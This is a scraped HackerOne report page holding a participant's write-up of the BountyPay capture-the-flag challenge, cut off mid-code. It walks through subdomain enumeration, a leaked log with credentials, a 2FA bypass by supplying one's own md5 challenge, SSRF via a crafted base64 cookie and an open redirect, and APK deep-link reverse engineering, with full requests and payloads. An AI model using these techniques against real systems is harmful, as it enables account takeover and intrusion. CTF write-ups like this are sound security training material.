cS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f2d940633f6003745f173d1a2ce382e2ea6b6313be96c79b5d56310dd211cb89","file_size":619390,"type":"image/png"},{"id":861012,"file_name":"apk-3_.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/euDGE1oMtwGhn9eHRsxwPDko?response-content-disposition=attachment%3B%20filename%3D%22apk-3_.png%22%3B%20filename%2A%3DUTF-8%27%27apk-3_.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3647c97822dc7caf85a446b4a594969f7659049326e75858cb816752a06ee372","file_size":332198,"type":"image/png"},{"id":861013,"file_name":"apk-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rZLkwmMvvr2cM5Nrgk8xZCUp?response-content-disposition=attachment%3B%20filename%3D%22apk-2.png%22%3B%20filename%2A%3DUTF-8%27%27apk-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=401cb32a0b06d8576f26a68aa9b0cc9e12cc6f4989d9d9f9aaacd411719eb57d","file_size":615917,"type":"image/png"},{"id":861014,"file_name":"sandra-allison.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyYuDeyrZqgPuZ2gtC8iXJff?response-content-disposition=attachment%3B%20filename%3D%22sandra-allison.png%22%3B%20filename%2A%3DUTF-8%27%27sandra-allison.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2d766aecf2fc8b7348f3a101ed26703f269c423a1c082d26a554787d0672cb1f","file_size":3707551,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-19T16:11:07.721Z","allow_singular_disclosure_after":-38791694.19019996,"singular_disclosure_allowed":true,"vote_count":4,"voters":["stealth-z","yudika","meispi","gathii"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8245468,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I accidentally posted my report although I haven't finished writing it. I will add the final one in another comment, sorry for the mess","automated_response":false,"created_at":"2020-06-09T17:30:28.589Z","updated_at":"2020-06-09T17:30:28.589Z","actor":{"username":"shakedko","cleared":false,"url":"/shakedko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8246375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"## TL;DR\n\nFlag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.\n\nThank you for this awesome challenge! \n\n## Introduction\n\nI have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short period of time. \n\nComing from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.\n\n## Tools \n\nI have used several tools during this process. You may find these tools in the following links:\n\n- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.\n\u003e A fast web fuzzer written in Go.\n\n- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/).\n\u003e SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.\n \n- [dex2jar](https://github.com/pxb1988/dex2jar)\n\u003e d2j-dex2jar: Convert .dex file to .class files (zipped as jar)\n\n- [JD-GUI](http://java-decompiler.github.io/)\n\u003e JD-GUI is a standalone graphical utility that displays Java source codes of ‚Äú.class‚Äù files. You can browse the reconstructed source code with the JD-GUI for instant access to methods and fields.\n\n- [Android Studio](https://developer.android.com/studio)\n\u003e Android Studio is the official integrated development environment for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development. \n\n- [ngrok](https://ngrok.com/)\n\u003e Public URLs for building webhook integrations.\n\n- [findomain](https://github.com/Edu4rdSHL/findomain)\n\u003e The fastest and cross-platform subdomain enumerator.\n\n\n## Description \n\nHackerOne has [tweeted](https://twitter.com/Hacker0x01/status/1266454022124376064/photo/1) about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: \n\n\u003e We need your help! CEO \n@martenmickos\n needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf \n\nThis meant that until there wasn't a place to make a payment, the CTF wasn't over. This kept me on track as every time I finished a step, as  I knew that I was on the right track but there was still something to be found. \n\n## Steps\n\n1. Reconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery).\n2. Open Redirect.\n3. Information Disclosure (Log File).\n4. Improper Authorization (2FA Bypass).\n5. SSRF (Via Cookie using Open Redirect).\n6. Information Disclosure (Directory Listing, In-house APK).\n7. Reverse Enginerring (APK).\n8. Information Disclosure (Twitter Account).\n9. Authentication Bypass (Creating Sandra's user).\n10.  CSRF, Parameter Pollution, Privilege Escalation via CSRF (CSS Class, `template` parameter).\n11.  Information Disclosure (CEO username \u0026 password).\n12.  SSRF (Via `.css` file).\n13.  CSS Keylogger via SSRF.\n\n### Step 1 - Reconnaissance \n\n#### Subdomain Enumartion\n\nThe scope `*.bountypay.h1ctf.com`, mentioned at https://hackerone.com/h1-ctf, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:\n\n```bash\n$ findomain -t bountypay.h1ctf.com\n\nTarget ==\u003e bountypay.h1ctf.com\n\nSearching in the Facebook API... üîç\nSearching in the Bufferover API... üîç\nSearching in the Threatminer API... üîç\nSearching in the AnubisDB API... üîç\nSearching in the CertSpotter API... üîç\nSearching in the Urlscan.io API... üîç\nSearching in the Threatcrowd API... üîç\nSearching in the Crtsh database API... üîç\nSearching in the Virustotal API... üîç\nSearching in the Sublist3r API... üîç\nSearching in the Spyse API... üîç\n\nstaff.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nbountypay.h1ctf.com\n\nA total of 6 subdomains were found for domain bountypay.h1ctf.com üëΩ in 2 seconds.‚è≤Ô∏è\n\nGood luck Hax0r üíÄ!\n```\n\n#### Understanding the Application \n\nI hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing `app.bountypay.h1ctf.com`.  \n\n#### Content Discovery\n\nAfter learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: \n\n- GET https://app.bountypay.h1ctf.com/cgit \n- GET https://app.bountypay.h1ctf.com/.git\n- GET https://api.bountypay.h1ctf.com/api\n- GET https://api.bountypay.h1ctf.com/api/staff\n- GET https://api.bountypay.h1ctf.com//api/accounts/\u003cword\u003e\n\n### Step 2 - Open Redirect\n\nWhile doing my recon, I saw that https://api.bountypay.h1ctf.com as an open redirect on the main page: https://api.bountypay.h1ctf.com/redirect?url=... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon\n\n#### Step 3 - Information Disclosure (Log File)\n\nScanning the `cgit` directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: \n\n```bash\ncat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq '.results[]'\n{\n  \"input\": {\n    \"FUZZ\": \"config\"\n  },\n  \"position\": 97,\n  \"status\": 200,\n  \"length\": 278,\n  \"words\": 19,\n  \"lines\": 12,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/config\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"index\"\n  },\n  \"position\": 20,\n  \"status\": 200,\n  \"length\": 0,\n  \"words\": 1,\n  \"lines\": 1,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/index\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"description\"\n  },\n  \"position\": 3838,\n  \"status\": 200,\n  \"length\": 73,\n  \"words\": 10,\n  \"lines\": 2,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/description\"\n}\n```\n\nLooking into these files, I have found  https://app.bountypay.h1ctf.com/cgit/config exposed a github repository: https://github.com/bounty-pay-code/request-logger.git which contained one file [logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) that showed me the way to the next step: \n\n```php\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n````\n\n[https://app.bountypay.h1ctf.com/bp_web_trace.log](bp_web_trace.log) log file contained the following base64 decoded strings: \n\n```\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nDecoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: \n\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\n### Step 4 - Improper Authorization\n\nOnce I tried to login with the credentials that I found, aka `username: brian.oliver`, `password: V7h0inzX`, I saw a 2FA. \n\nLooking into the input fields in the HTML, I saw that the challenge and the challenge's answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using `md5 -s 1` which resulted with `c4ca4238a0b923820dcc509a6f75849b` and then I just used `1` in order to login, and it worked. The request looked like this:\n\n```bash\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Length: 101\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=c4ca4238a0b923820dcc509a6f75849b\u0026challenge_answer=1\n```\n\nand the response: \n\n```bash\nHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:14:12 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000\nLocation: /\nContent-Length: 0\n```\n\nUsing this new cookie, I was logged in as Brian Oliver.\n\n### Step 5 - SSRF\n\nAfter I bypassed the application's 2FA using Brain Oliver's credentials, I tried to play with the application's feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. \n\nI looked into the request and I saw that it was doing the following request: \n\n```bash\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nReferer: https://app.bountypay.h1ctf.com/\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n```\n\nWhile returning the following response:\n\n```bash\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:17:38 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 177\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"}\n```\n\nAt that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. \n\nThe cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` \nDecoded: `{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` \n\nConsidering the fact that the `account_id` was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. \n\nI created a new cookie: `{\"account_id\":\"../../redirect?url=FUZZ\u0026\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: \n\n1. Known words and files\n2. Ideas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company's network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. \n\nPutting everything together, I found a directory listing while fuzzing which leads me to the next step \n\n### Step 6 - Information Disclosure (Directory Listing, In-house APK)\n\nAs mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: \n\n```bash\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n\n```\n\nand it's response gave me the hint for the next step: \n\n```bash\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:27:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 491\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/uploads\\/\u0026\\/statements?month=01\u0026year=2020\",\"data\":\"\u003chtml\u003e\\n\u003chead\u003e\u003ctitle\u003eIndex of \\/uploads\\/\u003c\\/title\u003e\u003c\\/head\u003e\\n\u003cbody bgcolor=\\\"white\\\"\u003e\\n\u003ch1\u003eIndex of \\/uploads\\/\u003c\\/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\\\"..\\/\\\"\u003e..\\/\u003c\\/a\u003e\\n\u003ca href=\\\"\\/uploads\\/BountyPay.apk\\\"\u003eBountyPay.apk\u003c\\/a\u003e                                        20-Apr-2020 11:26              4043701\\n\u003c\\/pre\u003e\u003chr\u003e\u003c\\/body\u003e\\n\u003c\\/html\u003e\\n\"}\n```\n\nLooking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL https://software.bountypay.h1ctf.com/uplodas/ worked even for non authenticated users. \n\n### Step 7 - Reverse Enginerring (APK)\n\nWhen I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. \n\nIn this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. \n\nOnce I had the code, I ran the APK using Android Studio's \"Profile or debug APK\". \n\nThere are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: \n\n- one://part\n- two://part\n- three://part\n\nEach part had a required URI with different parameters that were available in the code. \n\nIn order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: `one://part?start=PartTwoActivity` \n\n{F861011}\n\nI figured that I needed the `start=PartTwoActivity` together with a username as it was stated in the code: \n\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n    String str = getIntent().getData().getQueryParameter(\"start\");\n    if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) {\n    ...\n    startActivity(new Intent((Context)this, PartTwoActivity.class));\n    } \n} \n```\n\nOnce I was on the second Activity, I saw in the code that all inputs where invsible:\n\n```java\nEditText editText = (EditText)findViewById(2131230834);\nButton button = (Button)findViewById(2131230794);\nTextView textView = (TextView)findViewById(2131231002);\neditText.setVisibility(4);\nbutton.setVisibility(4);\ntextView.setVisibility(4\n```\n\nand all I had to do in order to make them visible was figuring out the params within the URL: \n\n```java\nUri uri = getIntent().getData();\nString str1 = uri.getQueryParameter(\"two\");\nString str2 = uri.getQueryParameter(\"switch\");\nif (str1 != null \u0026\u0026 str1.equals(\"light\") \u0026\u0026 str2 != null \u0026\u0026 str2.equals(\"on\")) {\n    editText.setVisibility(0);\n    button.setVisibility(0);\n    textView.setVisibility(0);\n} \n```\n\nTherefore, the URL was: `two://part?two=light\u0026switch=on`. This resulted with a hash, an input field which asked for a header name. \n\n{F861012}\n\nWhile doing some recon, I already saw a suspicious base64 code in the 3rd Activity:\n\n```java\nbyte[] decodedDirectory = Base64.decode(\"aG9zdA==\", 0);\n\nbyte[] decodedDirectoryTwo = Base64.decode(\"WC1Ub2tlbg==\", 0);\n\nfinal String directory = \"aG9zdA==\";\n\nfinal String directoryTwo = \"WC1Ub2tlbg==\";\n\nfinal String headerDirectory = \"header\";\n````\n\nDecoding both resulted with the following strings: \n\n```bash\n$ \"WC1Ub2tlbg==\" | base64 -d\nX-Token: \n$ \"aG9zdA==\" | base64 -d\nhost\n```\n\nUsing the `X-Token` header I got to the 3rd Activity, which again had insvisible components: \n\n```java\nprotected void onCreate(Bundle paramBundle) {\n    ...\n    final EditText editText = (EditText)findViewById(2131230837);\n    final Button button = (Button)findViewById(2131230796);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    ...\n}\n```\n\nLooking into the code, I saw that there was an HTTP request that was supposed to be fired once everything had been loaded correctly: \n\n```java\nthis.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n    public void onCancelled(DatabaseError param1DatabaseError) {\n        Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n    }\n    \n    public void onDataChange(DataSnapshot param1DataSnapshot) {\n        String str = (String)param1DataSnapshot.getValue();\n        if (firstParam != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 secondParam != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n        String str1 = thirdParam;\n        if (str1 != null) {\n            StringBuilder stringBuilder = new StringBuilder();\n            stringBuilder.append(\"X-\");\n            stringBuilder.append(str);\n            if (str1.equals(stringBuilder.toString())) {\n            editText.setVisibility(0);\n            